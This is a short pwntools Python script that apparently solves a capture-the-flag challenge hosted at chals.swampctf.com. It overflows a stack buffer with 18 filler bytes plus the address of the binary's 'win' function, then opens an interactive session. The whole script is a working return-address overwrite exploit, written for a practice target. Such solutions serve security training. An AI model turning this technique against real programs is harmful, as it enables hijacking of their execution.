from pwn import *

# Set the architecture and OS context
context.update(arch='x86_64', os='linux')
context.terminal = ['/bin/bash', '-c']  # Use standard Linux terminal

# Remote target details
HOST = "nc chals.swampctf.com 40001"
ADDRESS, PORT = HOST.split()[1:]

# Load the binary
BINARY_NAME = "./binary"
binary = context.binary = ELF(BINARY_NAME, checksec=False)

# Determine if running locally or remotely
if args.REMOTE:
    p = remote(ADDRESS, int(PORT))
else:
    p = process(binary.path)

# Payload parameters
length = 10 + 8
win = binary.sym.win
payload = length * b'A' + p64(win)

# Send payload
p.sendline(payload)
p.interactive()